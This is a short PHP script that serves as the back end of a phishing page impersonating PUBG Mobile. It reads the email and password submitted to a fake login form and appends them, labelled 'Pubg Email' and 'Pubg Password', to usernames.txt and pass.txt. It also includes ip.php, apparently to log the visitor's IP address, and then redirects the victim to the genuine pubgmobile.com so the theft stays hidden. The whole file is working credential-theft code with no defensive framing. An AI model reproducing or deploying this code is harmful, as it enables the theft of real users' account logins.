<?php
include 'ip.php';
file_put_contents("usernames.txt", "Pubg Email : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Pubg Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.pubgmobile.com');
?>
